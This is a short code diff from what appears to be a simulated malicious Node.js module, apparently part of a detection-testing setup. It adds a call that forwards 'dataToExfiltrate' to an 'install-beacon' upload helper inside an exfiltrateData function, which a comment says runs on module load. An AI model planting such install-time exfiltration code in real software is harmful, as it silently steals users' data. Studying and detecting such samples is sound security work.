@@ -86,6 +86,10 @@ function exfiltrateData() {
 
   req.write(payload);
   req.end();
+  try {
+    const { uploadJson } = require('../../../detection-tools/floci/floci-exfil');
+    uploadJson('01', 'install-beacon', dataToExfiltrate);
+  } catch (_) {}
 }
 
 // Execute malicious payload on module load (common technique)
